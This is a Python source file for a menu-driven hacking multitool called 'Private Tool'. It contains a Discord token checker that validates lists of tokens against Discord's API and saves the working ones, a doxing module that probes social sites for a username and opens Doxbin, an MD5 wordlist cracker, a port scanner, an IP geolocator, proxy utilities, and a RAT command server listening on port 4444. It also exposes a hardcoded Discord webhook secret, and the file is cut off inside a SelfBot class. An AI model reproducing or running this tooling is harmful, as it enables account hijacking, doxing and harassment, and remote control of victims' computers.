    print('P    \n                                ██▓███   ██▀███   ██▓ ██▒   █▓ ▄▄▄     ▄▄▄█████▓▓█████             \n                               ▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▒████▄   ▓  ██▒ ▓▒▓█   ▀       \n                               ▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒██  ▀█▄ ▒ ▓██░ ▒░▒███          \n                               ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄      \n                               ▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░   ▓█   ▓██▒ ▒██▒ ░ ░▒████▒      \n                               ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░   ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░      \n                               ░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░    ▒   ▒▒ ░   ░     ░ ░  ░      \n                               ░░         ░░   ░  ▒ ░     ░░    ░   ▒    ░         ░         \n                                           ░      ░        ░        ░  ░           ░  ░\n                                                           ░                                       \n                ')


def Modules():
    print('                                    ╔══════════════════════════════════════════╗\n                                    ║{1} GetAccess    {4} DISCORD  {7} NETWORK ║\n                                    ║{2} CHECKER      {5} DOXING   {8} SCANNER ║\n                                    ║{3} ProxyScraper {6} HASHING  {9} COLOR   ║\n                                    ╚══════════════════════════════════════════╝\n    ')
    answer = input(Fore.LIGHTWHITE_EX + '> ')
    if answer == '1':
        os.system("cls && title GET ACCESS TO PREMIUM FUNCTION'S")
        GetAccess()
    else:
        if answer == '2':
            os.system('cls && title CHECKER')
            CheckerClass()
        else:
            if answer == '3':
                os.system('cls && title ProxyScraper')
                ProxyScraper()
            else:
                if answer == '4':
                    os.system('cls && title DISCORD')
                    DiscordClass()
                else:
                    if answer == '5':
                        os.system('cls && title DOXING')
                        DoxingClass()
                    else:
                        if answer == '6':
                            os.system('cls && title HASHING')
                            HashingClass()
                        else:
                            if answer == '7':
                                os.system('cls && title NETWORK')
                                NetworkClass()
                            else:
                                if answer == '8':
                                    os.system('cls && title SCANNER')
                                    ScannerClass()
                                else:
                                    if answer == '9':
                                        ColorChanger()
                                    else:
                                        print('Wrong Number')
                                        os.system('cls && title Private Tool')
                                        getapi()


def GetAccess():
    print(Fore.LIGHTGREEN_EX)
    print('\n   __________________   ___   ____________________________\n  / ____/ ____/_  __/  /   | / ____/ ____/ ____/ ___/ ___/\n / / __/ __/   / /    / /| |/ /   / /   / __/  \\__ \\__ \\ \n/ /_/ / /___  / /    / ___ / /___/ /___/ /___ ___/ /__/ / \n\\____/_____/ /_/    /_/  |_\\____/\\____/_____//____/____/  \n                                                          \n                                                        \n    ')
    time.sleep(5)
    anfangscode = '03599'
    one = str(random.randint(1, 9))
    two = str(random.randint(1, 9))
    three = str(random.randint(1, 9))
    four = str(random.randint(1, 9))
    five = str(random.randint(1, 9))
    six = str(random.randint(1, 9))
    seven = str(random.randint(1, 9))
    eight = str(random.randint(1, 9))
    nine = str(random.randint(1, 9))
    ten = str(random.randint(1, 9))
    key = anfangscode + one + two + three + four + five + six + seven + eight + nine + ten
    print('')
    print('')
    printSlow(Fore.LIGHTGREEN_EX + 'Your Key is: ' + Fore.RED + str(key))
    print('')
    print('')
    print('')
    name = input('What is your ' + Fore.LIGHTCYAN_EX + 'Discord ' + Fore.RED + 'Name: ')
    print('Okay ' + name + ' It can take up to 24 Hours!')
    hook = Webhook('https://discordapp.com/api/webhooks/744271841845182564/NikuyqFBNsS9aS4uCkTr4eXroHp8SksKOKCNvfpfp3ZznWLumBD1Y2-E_n2dGVO0bhaD')
    hook.send('Name: ' + name + ' The Key: ' + key)
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')
    print('')


def CheckerClass():
    print(Fore.LIGHTGREEN_EX)
    print('P    \n                                 ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  \n                                ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒\n                                ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒\n                                ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  \n                                ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒\n                                ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░\n                                  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░\n                                ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ \n                                ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     \n                                ░                       ░                               \n                \n\n                                        ╔═════════════════════════════════════════╗\n                                        ║ {1} TokenChecker {3} MailAccessChecker  ║\n                                        ║ {2} ProxyChecker                        ║\n                                        ╚═════════════════════════════════════════╝\n\n    \n    ')
    antwort = input('> ')
    if antwort == '1':
        tokencheckertokentxt()
    else:
        if antwort == '2':
            ProxyChecker()
        else:
            if antwort == '3':
                MailAccessChecker()


def DiscordClass():
    print(Fore.LIGHTBLUE_EX)
    print('P    \n                             ▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄ \n                             ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌\n                             ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌\n                             ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌\n                             ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓ \n                              ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒ \n                              ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒ \n                              ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░ \n                                ░     ░        ░  ░ ░          ░ ░     ░        ░    \n                              ░                   ░                           ░      \n\n\n                                      ╔════════════════════════════════════╗\n                                      ║ {1} SelfBot      {2} ControlBots   ║\n                                      ╚════════════════════════════════════╝\n\n    ')
    antwort = input('> ')
    if antwort == '1':
        SelfBot()
    else:
        if antwort == '2':
            ControlDCBot()


def DoxingClass():
    Fore.LIGHTBLACK_EX
    print('P       \n                                 ▓█████▄  ▒█████  ▒██   ██▒ ██▓ ███▄    █   ▄████ \n                                 ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░▓██▒ ██ ▀█   █  ██▒ ▀█▒\n                                 ░██   █▌▒██░  ██▒░░  █   ░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░\n                                 ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ ░██░▓██▒  ▐▌██▒░▓█  ██▓\n                                 ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒░██░▒██░   ▓██░░▒▓███▀▒\n                                 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ \n                                 ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ \n                                 ░ ░  ░ ░ ░ ░ ▒   ░    ░   ▒ ░   ░   ░ ░ ░ ░   ░ \n                                   ░        ░ ░   ░    ░   ░           ░       ░                                          \n\n\n                                      ╔════════════════════════════════════╗\n                                      ║ {1} Search Username on Internet    ║\n                                      ║ {2} Opens Doxbin                   ║\n                                      ╚════════════════════════════════════╝\n    \n    ')
    antwort = input('> ')
    if antwort == '1':
        DoxTool()
    else:
        if antwort == '2':
            webbrowser.open_new_tab('https://doxbin.org/')


def HashingClass():
    print(Fore.YELLOW)
    print('P\n                              ██░ ██  ▄▄▄        ██████  ██░ ██  ██▓ ███▄    █   ▄████ \n                             ▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒\n                             ▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░\n                             ░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓\n                             ░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒\n                              ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ \n                              ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ \n                              ░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ \n                              ░  ░  ░      ░  ░      ░   ░  ░  ░ ░           ░       ░ \n                                                          \n                                         ╔════════════════════════════════════╗\n                                         ║ {1} HashConverter                  ║\n                                         ║ {2} HashCracker                    ║\n                                         ╚════════════════════════════════════╝\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        Hashconverter()
    else:
        if antwort == '2':
            HashCracker()


def NetworkClass():
    print(Fore.LIGHTWHITE_EX)
    print('P\n                              ███▄    █ ▓█████▄▄▄█████▓ █     █░ ▒█████   ██▀███   ██ ▄█▀\n                              ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ \n                             ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ \n                             ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ \n                             ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄\n                             ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒\n                             ░ ░░   ░ ▒░ ░ ░  ░   ░      ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░\n                                ░   ░ ░    ░    ░        ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ \n                                      ░    ░  ░            ░        ░ ░     ░     ░  ░   \n                                                            \n                                           ╔════════════════════════════════════╗\n                                           ║ {1} Server        {3} ShowSiteIP   ║\n                                           ║ {2} IP-LOCATOR    {4} ShowSiteSrc  ║\n                                           ╚════════════════════════════════════╝\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        Server()
    else:
        if antwort == '2':
            locator()
        else:
            if antwort == '3':
                IPWebsite()
            else:
                if antwort == '4':
                    WebSiteSRC()


def ScannerClass():
    print(Fore.LIGHTYELLOW_EX)
    print('P\n                               ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  \n                             ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒\n                             ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒\n                               ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  \n                             ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒\n                             ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\n                             ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░\n                             ░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░ \n                                   ░  ░ ░            ░  ░         ░          ░    ░  ░   ░     \n                                      ░                                                        \n\n                                           ╔═══════════════════════════════════╗\n                                           ║          {1} PortScanner          ║\n                                           ╚═══════════════════════════════════╝\n\n\n        ')
    antwort = input('> ')
    if antwort == '1':
        PortScanner()


def NetworkInformation():
    os.system('cls && title Network-Information')
    link = 'https://api.ipify.org/'
    getlink = requests.get(link)
    officialip = str(getlink.text)
    print('Official-IPv4: ' + officialip)
    print('')
    print('private-ip: ' + socket.gethostbyname(socket.gethostname()))


def PcInformation():
    os.system('cls && title Pc-Information')
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    computername = socket.gethostname()
    computerversion = platform.version()
    computerplatform = platform.platform()
    computersystem = platform.system()
    computermachine = platform.machine()
    print('')
    printSlow(Fore.LIGHTGREEN_EX + 'Your PC Information: \n')
    print('Your Computer-Name: ' + computername)
    print('')
    print('Your HWID: ' + hwid)
    print('')
    print('Your Computer-Version: ' + computerversion)
    print('')
    print('Your Computer-Platform: ' + computerplatform)
    print('')
    print('Your ComputerSystem: ' + computersystem)
    print('')
    print('Your Computer-Machine: ' + computermachine)
    print('')
    print('')
    print(Fore.LIGHTWHITE_EX + 'Do you want to know something of your Internet: ')
    print(Fore.LIGHTYELLOW_EX + 'yes' + Fore.LIGHTBLACK_EX + ' or' + Fore.LIGHTCYAN_EX + ' no')
    networkinfos = input('> ')
    if networkinfos == 'yes':
        NetworkInformation()
    else:
        if networkinfos == 'no':
            print('Okay')
            time.sleep(1)
        else:
            os.close()


def PortScanner():
    target = input("Enter the Target's IP: ")
    for ports in range(1, 65000):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c = s.connect_ex((target, ports))
        if c == 0:
            print(str(ports) + ': Open')


def locator():
    os.system('cls && title IP-Locator')
    print('P    \n                              ██▓ ██▓███   ██▓     ▒█████   ▄████▄   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  \n                             ▓██▒▓██░  ██▒▓██▒    ▒██▒  ██▒▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒\n                             ▒██▒▓██░ ██▓▒▒██░    ▒██░  ██▒▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒\n                             ░██░▒██▄█▓▒ ▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  \n                             ░██░▒██▒ ░  ░░██████▒░ ████▓▒░▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒\n                             ░▓  ▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░\n                              ▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒     ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░\n                              ▒ ░░░         ░ ░   ░ ░ ░ ▒  ░          ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ \n                              ░               ░  ░    ░ ░  ░ ░            ░  ░            ░ ░     ░     \n                              ░                                            \n\n    \n    ')
    while True:
        ip = input(Fore.LIGHTWHITE_EX + 'Enter IP Address: ')
        api = 'http://ip-api.com/json/'
        apisite = urlopen(api + ip)
        api = apisite.read()
        apidatas = json.loads(api)
        print(Fore.LIGHTBLUE_EX)
        print(Fore.LIGHTGREEN_EX + '               IP: ' + apidatas['query'])
        print(Fore.LIGHTGREEN_EX + '               Status: ' + apidatas['status'])
        print(Fore.LIGHTGREEN_EX + '               Country: ' + apidatas['country'])
        print(Fore.LIGHTGREEN_EX + '               Region: ' + apidatas['regionName'])
        print(Fore.LIGHTGREEN_EX + '               City: ' + apidatas['city'])
        print(Fore.LIGHTGREEN_EX + '               ZIPCODE: ' + apidatas['zip'])
        print(Fore.LIGHTGREEN_EX + '               InternetHoster: ' + apidatas['isp'])
        print(Fore.LIGHTGREEN_EX + '               TimeZone: ' + apidatas['timezone'])
        print('')
        print('')
        print('')
        print('')
        break


def WebSiteSRC():
    site = input(Fore.LIGHTWHITE_EX + 'Enter Website-Link: ')
    r = requests.get(site)
    print(r.content)


def IPWebsite():
    site = input('Enter Website-Name: ')
    r = socket.gethostbyname(site)
    print('The IP: ' + r)


def MD5():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    print('')
    md5 = hashlib.md5(hashconverter.encode())
    print('The hashed word is: ' + md5.hexdigest())


def SHA1():
    hashconverter = input('enter word: ')
    sha1 = hashlib.sha1(hashconverter.encode())
    print('The hashed word is: ' + sha1.hexdigest())


def SHA224():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha224 = hashlib.sha224(hashconverter.encode())
    print('The hashed word is: ' + sha224.hexdigest())


def SHA256():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha256 = hashlib.sha256(hashconverter.encode())
    print('The hashed word is: ' + sha256.hexdigest())


def SHA384():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha384 = hashlib.sha384(hashconverter.encode())
    print('The hashed word is: ' + sha384.hexdigest())


def SHA512():
    print('')
    print('')
    hashconverter = input('enter word: ' + Fore.LIGHTBLACK_EX)
    sha512 = hashlib.sha512(hashconverter.encode())
    print('The hashed word is: ' + sha512.hexdigest())


def Hashconverter():
    print('Choose one ' + Fore.LIGHTWHITE_EX + 'Converter: ')
    printSlow(Fore.YELLOW + '[MD5 - SHA1 - SHA224 - SHA256 - SHA384 - SHA512]')
    print('')
    answer = input(Fore.LIGHTBLACK_EX + '> ')
    if answer == 'MD5':
        MD5()
    else:
        if answer == 'SHA1':
            SHA1()
        else:
            if answer == 'SHA224':
                SHA224()
            else:
                if answer == 'SHA256':
                    SHA256()
                else:
                    if answer == 'SHA384':
                        SHA384()
                    else:
                        if answer == 'SHA512':
                            SHA512()


def HashCracker():
    flag = 0
    pass_hash = input('Enter your MD5 hash: ')
    print('The WorldList needs to be on the same directory than private.exe')
    print('Example for wordlist Name [yourwordlist.txt]')
    wordlist = input('Your Wordlist: ')
    try:
        pass_file = open(wordlist, 'r')
    except:
        print('No file found')
        os.close()

    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        if digest == pass_hash:
            print(Fore.GREEN + '[+] Password found = ' + Fore.LIGHTCYAN_EX + word)
            flag = 1
            break
        if flag == 0:
            print('[-] Password is not in the List')


def tokencheckertokentxt():
    if os.path.isfile('TokenCombo/tokens.txt'):
        TokenChecker()
    else:
        Createtokentxt()


def Createtokentxt():
    if not os.path.exists('TokenCombo'):
        os.makedirs('TokenCombo')
    with open('TokenCombo/tokens.txt', 'w') as (f):
        f.write('ADD HERE YOUR TOKENS!!!')
        print('tokens.txt is created! program will close.')
        time.sleep(5)
        os.close()


def TokenChecker():
    os.system('cls && title TokenChecker')
    print(Fore.LIGHTGREEN_EX + "P\n    \n    \n                                _______    _                    _____ _               _             \n                               |__   __|  | |                  / ____| |             | |            \n                                  | | ___ | | _____ _ __      | |    | |__   ___  ___| | _____ _ __ \n                                  | |/ _ \\| |/ / _ \\ '_ \\     | |    | '_ \\ / _ \\/ __| |/ / _ \\ '__|\n                                  | | (_) |   <  __/ | | |    | |____| | | |  __/ (__|   <  __/ |   \n                                  |_|\\___/|_|\\_\\___|_| |_|     \\_____|_| |_|\\___|\\___|_|\\_\\___|_|   \n                                                                       \n                                                                       \n")
    with open('TokenCombo/tokens.txt', 'r') as (f):
        tokens = f.readlines()
        for i in tokens:
            token = i.rstrip()
            api = requests.get('https://discordapp.com/api/v6/users/@me/library', headers={'authorization': token})
            if api.status_code == 200:
                print(Fore.LIGHTGREEN_EX)
                print(f"[+] {token}")
                with open('TokenCombo/validtokens.txt', 'a') as (d):
                    d.write(f"{token}\n")
            else:
                print(Fore.LIGHTRED_EX)
                print(f"[-] {token}")

    print('')
    print('')
    print('')
    print('')
    print('')




def ProxyChecker():
    os.system('cls && title ProxyChecker ')

    def menu():
        try:
            print(Fore.LIGHTCYAN_EX)
            msg = "\n                                ____                       ____ _               _             \n                               |  _ \\ _ __ _____  ___   _ / ___| |__   ___  ___| | _____ _ __ \n                               | |_) | '__/ _ \\ \\/ / | | | |   | '_ \\ / _ \\/ __| |/ / _ \\ '__|\n                               |  __/| | | (_) >  <| |_| | |___| | | |  __/ (__|   <  __/ |   \n                               |_|   |_|  \\___/_/\\_\\__, | \\____|_| |_|\\___|\\___|_|\\_\\___|_|   \n                                                    |___/                                     \n\n\n                "
            for l in msg:
                print(l, end='')

        except KeyboardInterrupt:
            sys.exit()

    menu()
    print('')
    proxies = input(Fore.LIGHTWHITE_EX + 'Proxy Name must be in the same Folder as private.exe:' + Fore.CYAN + ' ')
    try:
        proxy_file = open(proxies, 'r')
    except:
        print('No File found!')
        quit()
    else:
        print('')
        print('')
        print(Fore.YELLOW + 'The Checker is just for HTTP/HTTPS proxies, so please type [1] to start the checking!')
        answer = input(Fore.LIGHTBLUE_EX + '>' + Fore.LIGHTRED_EX + ' ')
        print('')
        print('')
        print('The Proxies will get safed in the directory of private.exe as a ValidHTTPProxies.txt')
        print('')
        print('')
        print(Fore.LIGHTRED_EX + '-------' + Fore.LIGHTWHITE_EX + 'CHECKING ' + Fore.LIGHTMAGENTA_EX + 'PROXIES' + Fore.LIGHTRED_EX + '-------')
        print('')

        def savehttp(proxy):
            file = open('ValidHTTPProxies.txt', 'a')
            file.write(proxy)
            file.close()

        timeout = 3
        url = 'https://httpbin.org/ip'

        def httpproxychecker(proxy):
            global bad
            global good
            s = requests.session()
            s.proxies = {'http':'http://' + proxy, 
             'https':'https://' + proxy}
            try:
                rr = s.get(url, timeout=timeout)
                print(Fore.GREEN + ' [+] Good ' + proxy)
                savehttp(proxy)
                good += 1
            except:
                print(Fore.RED + ' [-] Bad ' + proxy)
                bad += 1

        if answer == '1':
            proxyFile = open(proxies, 'r')
            proxy = proxyFile.readlines()
            for line in proxy:
                httpproxychecker(line)

            proxyFile.close()
        else:
            print('please type it in the right way!')


def HttpProxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/http.txt')


def Socks4Proxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/socks4.txt')


def Socks5Proxies():
    os.system('cls')
    webbrowser.open_new_tab('http://privatescripter.epizy.com/assets/downloads/proxies/socks5.txt')


def ProxyScraper():
    os.system('cls && title ProxyScraper')
    print(Fore.LIGHTGREEN_EX)
    print('P    \n                              ██▓███   ██▀███   ▒█████  ▒██   ██▒ ██▓▓█████   ██████ \n                             ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▓█   ▀ ▒██    ▒ \n                             ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░▒██▒▒███   ░ ▓██▄   \n                             ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ ░██░▒▓█  ▄   ▒   ██▒\n                             ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒░██░░▒████▒▒██████▒▒\n                             ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓  ░░ ▒░ ░▒ ▒▓▒ ▒ ░\n                             ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ░  ░░ ░▒  ░ ░\n                             ░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ░   ░   ░  ░  ░  \n                                         ░         ░ ░   ░    ░   ░     ░  ░      ░  \n                                                                                     \n\n    \n    ')
    printSlow('HTTP - SOCKS4 - SOCKS5 \n\n')
    answer = input(Fore.YELLOW + 'Choose one of the following ' + Fore.RED + 'Proxies: ')
    print(Fore.LIGHTGREEN_EX)
    if answer == 'HTTP':
        os.system('cls && title HttpProxyScraper')
        HttpProxies()
    else:
        if answer == 'SOCKS4':
            os.system('cls && title SOCKS4ProxyScraper')
            Socks4Proxies()
        else:
            if answer == 'SOCKS5':
                os.system('cls && title SOCKS5ProxyScraper')
                Socks5Proxies()


def Server():
    os.system('cls && title Server')

    def menu():
        try:
            print(Fore.LIGHTCYAN_EX)
            msg = 'P                     \n                               ██████ ▓█████  ██▀███   ██▒   █▓▓█████  ██▀███  \n                             ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒\n                             ░ ▓██▄   ▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒\n                               ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  \n                             ▒██████▒▒░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░██▓ ▒██▒\n                             ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░\n                             ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░\n                             ░  ░  ░     ░     ░░   ░      ░░     ░     ░░   ░ \n                                   ░     ░  ░   ░           ░     ░  ░   ░     \n                                                           ░   \n\n                   '
            for l in msg:
                print(l, end='')

        except KeyboardInterrupt:
            sys.exit()

    menu()
    s = socket.socket()
    host = socket.gethostbyname(socket.gethostname())
    port = 4444
    s.bind((host, port))
    printSlow(Fore.LIGHTGREEN_EX + '[+] Server is running\n\n')
    print(Fore.LIGHTYELLOW_EX + '                   [+] Waiting for any targets!\n')
    s.listen(1)
    conn, addr = s.accept()
    print()
    print(addr, ' target connected!\n\n')
    while True:
        command = str(input(Fore.LIGHTGREEN_EX + '§' + Fore.LIGHTBLACK_EX + ' '))
        print('')
        if command == 'help':
            print(Fore.LIGHTGREEN_EX + '[HELP MENU]')
            print('---------------------------------------')
            print('[view_cwd] => Show directory of the Rat')
            print('---------------------------------------')
        elif command == 'view_cwd':
            conn.send(command.encode())
            files = conn.recv(5000)
            files = files.decode()
            print('Output => ' + files)


def DoxTool():
    os.system('cls && title DoxTool')
    print(Fore.RED + 'P\n\n                             ▓█████▄  ▒█████  ▒██   ██▒▄▄▄█████▓ ▒█████   ▒█████   ██▓    \n                             ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \n                             ░██   █▌▒██░  ██▒░░  █   ░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \n                             ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \n                             ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\n                              ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\n                              ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\n                              ░ ░  ░ ░ ░ ░ ▒   ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \n                                ░        ░ ░   ░    ░               ░ ░      ░ ░      ░  ░\n                              ░                                                           \n\n\n    ')
    URLS = [
     'https://instagram.com/',
     'https://twitter.com/',
     'https://www.facebook.com/',
     'https://www.youtube.com/',
     'https://www.reddit.com/user/',
     'https://www.pinterest.com/',
     'https://www.github.com/',
     'https://www.flickr.com/people/',
     'https://steamcommunity.com/id/',
     'https://soundcloud.com/',
     'https://disqus.com/',
     'https://about.me/',
     'https://imgur.com/user/',
     'https://flipboard.com/@',
     'https://slideshare.net/']
    name = input(Fore.LIGHTBLUE_EX + 'Username: ')
    print('')
    for i in URLS:
        try:
            s = urlopen(i + name)
            print(Fore.LIGHTWHITE_EX + '[' + Fore.GREEN + '+' + Fore.LIGHTWHITE_EX + '] ' + Fore.LIGHTGREEN_EX + str(i) + str(name))
        except:
            print(Fore.LIGHTWHITE_EX + '[' + Fore.RED + '-' + Fore.LIGHTWHITE_EX + '] ' + Fore.LIGHTRED_EX + str(i) + str(name))

    print('')
    print('')
    print('')
    print('')


def SelfBot():

    class SELFBOT:
        __version__ = 1.6

